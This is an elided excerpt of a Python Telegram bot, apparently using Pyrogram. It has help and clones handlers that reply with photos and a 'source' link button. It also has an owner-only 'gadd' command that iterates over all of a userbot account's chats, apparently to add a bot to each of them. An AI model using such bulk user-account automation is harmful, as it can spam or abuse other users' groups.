...
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://files.catbox.moe/cv4hdv.jpg",
        caption=f"""🍁𝐂𝐋𝐈𝐂𝐊🥰𝐁𝐄𝐋𝐎𝐖💝𝐁𝐔𝐓𝐓𝐎𝐍✨𝐓𝐎🙊𝐆𝐄𝐓🌱𝐑𝐄𝐏𝐎🍁""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "ƨσʋяcɛ", url=f"https://bgkk-spotify.onrender.com/"
                    )
                ]
            ]
        ),
...
async def clones(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://files.catbox.moe/8ny5wd.jpg",
...
@app.on_message(filters.command("gadd") & filters.user(int(8066183540)))
async def add_allbot(client, message):
    ...
    try:
        ...
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1002664837873:
                continue
            try:
